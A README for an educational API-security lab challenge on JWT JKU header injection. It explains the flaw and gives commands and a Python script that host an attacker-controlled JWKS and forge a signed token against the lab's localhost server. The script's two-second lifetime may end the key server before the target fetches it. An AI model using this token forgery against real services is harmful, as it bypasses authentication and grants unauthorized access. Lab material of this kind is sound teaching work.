# JWT JKU Header Injection

This challenge demonstrates a JWT implementation vulnerable to **JKU header injection**: when the token header carries a `jku` (JWK Set URL) field, the server fetches the JWKS document from that attacker-controlled URL to verify the signature, instead of validating `jku` against an allowlist of trusted endpoints. Since the attacker can host their own JWKS and sign with the matching private key, they can forge a token that verifies successfully against a key they control.

## How to run it

```bash
go run main.go serve
```

## How to exploit it

```bash
# Get a sample legit token — no jku header, verified against the server's pinned key
TOKEN=$(go run main.go jwt)
curl -i http://localhost:8080/ -H "Authorization: Bearer $TOKEN"

# Forge a token: host a JWKS with your own key and point jku at it, then sign with the matching private key
FORGED=$(jwtop exploit jkuinjection "$TOKEN")
curl -i http://localhost:8080/ -H "Authorization: Bearer $FORGED"
```

Equivalent without `jwtop`, using PyJWT and a throwaway HTTP server to host the attacker's JWKS:

```bash
python3 -c "
import json, threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from cryptography.hazmat.primitives.asymmetric import rsa
import jwt
from jwt.algorithms import RSAAlgorithm

key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
jwk = json.loads(RSAAlgorithm.to_jwk(key.public_key()))
jwk.update(kid='attacker-key', alg='RS256', use='sig')
jwks = json.dumps({'keys': [jwk]}).encode()

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(jwks)
    def log_message(self, *args):
        pass

server = HTTPServer(('0.0.0.0', 9000), Handler)
threading.Thread(target=server.serve_forever, daemon=True).start()

forged = jwt.encode(
    {'sub': 'attacker'},
    key,
    algorithm='RS256',
    headers={'kid': 'attacker-key', 'jku': 'http://localhost:9000/jwks.json'},
)
print(forged)

import time
time.sleep(2)  # keep the JWKS server alive long enough for the target to fetch it
"
```

## Disclaimer

The challenges provided in this repository are designed to be educational and for testing purposes only. Do not attempt to exploit vulnerabilities in systems or APIs without proper authorization. Always ensure that you have the necessary permissions to conduct security testing on any system or application.

---

Learn more about API security at [Cerberauth](https://www.cerberauth.com/)
